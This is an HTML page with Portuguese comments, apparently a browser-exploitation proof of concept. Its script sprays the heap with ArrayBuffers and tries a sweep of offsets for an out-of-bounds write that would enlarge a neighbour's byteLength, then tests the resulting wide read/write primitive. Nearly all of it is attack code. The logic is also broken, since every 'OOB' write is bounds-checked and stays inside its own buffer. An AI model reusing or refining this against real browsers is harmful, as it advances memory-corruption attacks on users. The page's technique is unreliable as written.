<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Foco: Corrupção de byteLength de ArrayBuffer</title>
    <style> /* ... (mesmos estilos de log dos scripts anteriores) ... */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; }
        .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>Foco: Corrupção de <code>byteLength</code> de ArrayBuffer</h1>
    <p>Tenta usar uma escrita OOB para corromper o tamanho de um ArrayBuffer vizinho, buscando uma primitiva de Leitura/Escrita mais ampla.</p>
    <button id="runBtn" onclick="runByteLengthCorruptionTest()">Iniciar Teste de Corrupção de byteLength</button>
    <div id="output"></div>

    <script>
        const outputDiv = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');
        const SHORT_PAUSE = 50;
        // ... (funções log, PAUSE, toHex - copie-as do script anterior) ...
        const log = (message, type = 'info', funcName = '') => { /* ... implementação do log ... */
            if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}]`;
                const prefix = funcName ? `[${funcName}] ` : '';
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                if (outputDiv.innerHTML.length > 800000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
        };
        const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
        const toHex = (val, bits = 32) => {
            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
            let num = Number(val);
            if (bits <= 32) { num = num >>> 0; }
            const pad = Math.ceil(bits / 4);
            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
        };


        const attemptByteLengthCorruption = async () => {
            const FNAME = 'attemptByteLengthCorruption';
            log("--- Iniciando Teste: Corrupção de byteLength ---", 'test', FNAME);

            const controlBufferSize = 64;    // Tamanho do buffer que fará a escrita OOB
            const oobWriteSize = 4;          // Vamos tentar escrever um U32 (para o byteLength)
            const corruptedNewSize = 0x7FFFFFFE; // Novo tamanho grande desejado para o buffer alvo

            const targetBufferOriginalSize = 64; // Tamanho original dos buffers alvo
            const numTargetBuffers = 200;   // Número de buffers alvo para "spray" na heap
            const targetBuffers = [];

            // Alocação do buffer de controle (deve ser um pouco maior para a escrita OOB)
            // A ideia é que a escrita OOB do controlBuffer atinja os metadados de um targetBuffer.
            // O `allocationSizeControl` precisa ser suficiente para `controlBufferSize` + `offsetDaEscritaOOB`.
            // O offset exato para o byteLength de um buffer adjacente é a chave e é difícil de prever.
            // Geralmente, metadados (incluindo byteLength) precedem os dados do buffer.
            // Se `controlBuffer` está em `addrA` e `targetBuffer` em `addrB`, queremos que
            // `addrA + controlBufferSize + oobOffsetParaMetadados` seja o endereço do `byteLength` de `addrB`.

            const allocationSizeControl = controlBufferSize + 128; // Espaço extra para OOB
            let controlBuffer, controlDv;
            try {
                controlBuffer = new ArrayBuffer(allocationSizeControl);
                controlDv = new DataView(controlBuffer);
                for (let i = 0; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC); // Preenche
                log(`Buffer de controle (${allocationSizeControl} bytes) alocado e preenchido.`, 'info', FNAME);
            } catch (e) {
                log(`Erro ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
                return;
            }

            log(`Alocando ${numTargetBuffers} buffers alvo de ${targetBufferOriginalSize} bytes...`, 'info', FNAME);
            for (let i = 0; i < numTargetBuffers; i++) {
                try {
                    targetBuffers.push(new ArrayBuffer(targetBufferOriginalSize));
                } catch (e) {
                    log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME);
                }
            }
            log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
            await PAUSE(100);

            // Estes offsets são suposições e precisam ser testados/ajustados.
            // Eles são relativos ao *fim* do `controlBufferSize` útil.
            // O byteLength pode estar *antes* dos dados do buffer na memória, ou em uma estrutura de metadados.
            // Se estiver antes, um offset negativo a partir do início de um buffer poderia atingir o byteLength do anterior.
            // Se estiver em metadados após o buffer de controle, seriam positivos.
            // Para este exemplo, vamos testar alguns offsets positivos após o `controlBufferSize`.
            // A suíte original usava baseOffsetInBuffer + controlBufferSize + tryOffset.
            const baseOffsetInControl = 64; // Onde os dados "úteis" do controlBuffer começam
            const metadataOffsetsToTry = [-16, -12, -8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60, 64];
            let corruptionSuccess = false;
            let corruptedBufferIndex = -1;
            let successOffset = 0;

            for (const tryOffset of metadataOffsetsToTry) {
                if (corruptionSuccess) break;

                const oobWriteAddress = baseOffsetInControl + controlBufferSize + tryOffset;
                const relOffsetStr = `ctrlEnd+${tryOffset} (abs no controlBuffer ${oobWriteAddress})`;
                log(`Tentando escrita OOB U32 (valor ${toHex(corruptedNewSize)}) em ${relOffsetStr}`, 'info', FNAME);

                if (oobWriteAddress < 0 || (oobWriteAddress + oobWriteSize) > controlBuffer.byteLength) {
                    log(`Offset ${relOffsetStr} está fora dos limites do buffer de controle alocado. Pulando.`, 'warn', FNAME);
                    continue;
                }

                try {
                    // Tenta a escrita OOB
                    controlDv.setUint32(oobWriteAddress, corruptedNewSize, true); // Little-endian
                    log(`Escrita OOB U32 em ${relOffsetStr} parece OK. Verificando buffers alvo...`, 'info', FNAME);

                    await PAUSE(50); // Pausa para propagar

                    // Verifica se algum buffer alvo foi corrompido
                    for (let i = 0; i < targetBuffers.length; i++) {
                        if (!targetBuffers[i]) continue;
                        if (targetBuffers[i].byteLength === corruptedNewSize) {
                            log(`!!! VULN: ArrayBuffer alvo ${i} teve byteLength CORROMPIDO para ${toHex(corruptedNewSize)} !!!`, 'critical', FNAME);
                            log(`   Offset de escrita OOB relativo ao fim do controlBuffer: ${tryOffset}`, 'critical', FNAME);
                            log(`   Este buffer agora teoricamente oferece Leitura/Escrita Ampliada.`, 'escalation', FNAME);
                            corruptionSuccess = true;
                            corruptedBufferIndex = i;
                            successOffset = tryOffset;

                            // Teste rápido da Leitura/Escrita Ampliada
                            try {
                                const corruptedTargetDv = new DataView(targetBuffers[i]);
                                const testAddr = targetBufferOriginalSize + 100; // Um endereço bem além do original
                                const testVal = 0xDEADBEEF;

                                if (testAddr < corruptedTargetDv.byteLength - 4) { // Checa se está dentro do NOVO tamanho
                                    log(` -> Tentando escrever ${toHex(testVal)} no offset ${testAddr} do buffer corrompido ${i}...`, 'info', FNAME);
                                    corruptedTargetDv.setUint32(testAddr, testVal, true);
                                    const readBack = corruptedTargetDv.getUint32(testAddr, true);
                                    if (readBack === testVal) {
                                        log(` ---> SUCESSO! Leitura/Escrita além dos limites originais do ArrayBuffer ${i} CONFIRMADA! Leu ${toHex(readBack)}.`, 'vuln', FNAME);
                                        log(` ---> *** ALERTA: PRIMITIVA DE R/W ARBITRÁRIA (limitada ao novo tamanho ${toHex(corruptedNewSize)}) OBTIDA! ***`, 'escalation', FNAME);
                                    } else {
                                        log(` ---> FALHA no teste de R/W ampliado: leu ${toHex(readBack)}, esperava ${toHex(testVal)}.`, 'warn', FNAME);
                                    }
                                } else {
                                    log(` -> Teste de R/W ampliado: offset ${testAddr} fora do novo tamanho corrompido ${corruptedTargetDv.byteLength}.`, 'info', FNAME);
                                }
                            } catch (eTest) {
                                log(` -> ERRO ao tentar R/W ampliado no buffer corrompido ${i}: ${eTest.message}`, 'error', FNAME);
                            }
                            break; // Sai do loop de verificação dos buffers
                        }
                    }
                    // Restaura o valor no controlBuffer se não houve sucesso ainda (para isolar o efeito do offset)
                    // ou se você quiser que apenas um buffer seja corrompido
                    if (!corruptionSuccess) {
                         controlDv.setUint32(oobWriteAddress, 0xCCCCCCCC, true); // Restaura com um padrão
                    }

                } catch (eWrite) {
                    log(`Escrita OOB U32 em ${relOffsetStr} FALHOU/Bloqueada: ${eWrite.message}`, 'good', FNAME);
                }
                if (corruptionSuccess) break;
                 await PAUSE(20);
            }

            if (corruptionSuccess) {
                log(`--- Corrupção de byteLength BEM-SUCEDIDA no buffer ${corruptedBufferIndex} usando offset de escrita OOB ${successOffset} ---`, 'test', FNAME);
            } else {
                log("--- Nenhuma corrupção de byteLength detectada com os offsets testados. ---", 'test', FNAME);
            }
        };

        const runByteLengthCorruptionTest = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            log("==== INICIANDO TESTE DE CORRUPÇÃO DE BYTELENGTH ====", 'test', 'Main');
            await attemptByteLengthCorruption();
            log("\n==== TESTE DE CORRUPÇÃO DE BYTELENGTH CONCLUÍDO ====", 'test', 'Main');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
